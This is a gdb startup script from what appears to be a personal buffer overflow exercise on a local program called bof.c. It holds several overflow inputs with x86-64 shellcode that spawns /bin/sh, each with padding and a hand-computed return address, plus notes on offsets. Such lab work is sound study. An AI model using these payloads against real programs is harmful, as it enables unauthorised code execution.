# program args
# You have got to be fscking kidding me.  Arm implementation of
# gdb on this debian vm does not work with set args even though
# the command is available.  Someone else had a similar error
# http://stackoverflow.com/questions/31031403/pass-arguments-to-arm-program-while-remotely-debugging
# Ok its even worse.  If you run gdb with args on the gdb command invokation 
# they are not used.  you must set args prior to issuing run
# command. OMFG
# I'm leaving it in there for when I dork with the file on x64
#
# Okay I stand corrected.  It worked the last time.
# 
# And now I figured out why.  if you run normally it works, 
# but if you do a rerun like so run > outfile.txt
# It overwrites the args. Consquently I have added the
# redirect of stdout below.
#

# setups for specific programs
#
# args for bof.c
break main
# for demo to see buffer
# set args $(python2 -c 'print "A" * 300')
# for jump to start of buffer
#set args $(python2 -c 'print "A" * 264 + "\x7f\xff\xff\xff\xe2\x90"[::-1]')
# args which are the result of shell.asm
# we know the buffer is 64 bytes and the hexcode is 57 bytes.  we know the return
# address is the next 8 bytes.  The first two bytes must be zero
# and the next 6 bytes must be the address of buffer.  We know the buffer
# is at 0x7f....de50

# the raw code
#set args '\xeb\x2a\x5f\x48\x89\xe3\x48\x83\xc4\x08\x67\x48\x89\x1c\x24\x48\x89\xe1\x48\x89\xc8\x48\x83\xc0\x04\x48\x31\xd2\x67\x48\x89\x10\x48\x31\xc0\x48\x89\xc2\x48\x83\xc0\x0b\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00'

# the working code
#set args `printf "\xeb\x2a\x5f\x48\x89\xe3\x48\x83\xc4\x08\x67\x48\x89\x1c\x24\x48\x89\xe1\x48\x89\xc8\x48\x83\xc0\x04\x48\x31\xd2\x67\x48\x89\x10\x48\x31\xc0\x48\x89\xc2\x48\x83\xc0\x0b\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x43\x44\x45\x46\x47\x48\x41\x42\x43\x44\x45\x46\x47\x48\x50\xde\xff\xff\xff\x7f"`

#set args `printf "\x41\x41\x41\x41\x41\x41\x41\x41\xeb\x2a\x5f\x48\x89\xe3\x48\x83\xc4\x08\x67\x48\x89\x1c\x24\x48\x89\xe1\x48\x89\xc8\x48\x83\xc0\x04\x48\x31\xd2\x67\x48\x89\x10\x48\x31\xc0\x48\x89\xc2\x48\x83\xc0\x0b\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x43\x44\x45\x46\x47\x48\x38\xde\xff\xff\xff\x7f"`

# using the shell code as is, but with buffer big enough that it does not overflow
#set args `printf "\xeb\x23\x5f\x80\x77\x07\x41\x48\x8d\x07\x48\x89\x47\x08\x48\x89\xfe\x48\x83\xc6\x08\x48\x31\xd2\x48\x89\x57\x10\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05\xe8\xd8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41"`

# using the shell code as is, but with buffer big enough that it does not overflow and appending
# buffer address taking into account that address is 0x007fffff ffffffff max.  Also knowing
# that address of buffer is 0x7fffffffde40
#set args `printf "\xeb\x23\x5f\x80\x77\x07\x41\x48\x8d\x07\x48\x89\x47\x08\x48\x89\xfe\x48\x83\xc6\x08\x48\x31\xd2\x48\x89\x57\x10\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05\xe8\xd8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x40\xde\xff\xff\xff\x7f"`

# With buffer big enough to overflow, 
# We have 64 bytes for total buffer size
# For the first try, I'll append shell code with A's to fill up buffer and then tack on
# the address of the buffer
# on the 
# We have 50 bytes of shell code. 64-50 = 14. So add 14 bytes of address after
# shell code and then add the address of buffer. 
#
# Note, the address used to point to buffer changes, so it needs to be offset 30 when run in gdb
# after the leave which is because there is extra 8bytes between buffer and return address.  See notes
# 
set args `printf "\xeb\x23\x5f\x80\x77\x07\x41\x48\x8d\x07\x48\x89\x47\x08\x48\x89\xfe\x48\x83\xc6\x08\x48\x31\xd2\x48\x89\x57\x10\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05\xe8\xd8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42\x42\x42\x42\x42\x30\xde\xff\xff\xff\x7f"`

source .gdbenv
layout next
layout next
focus cmd
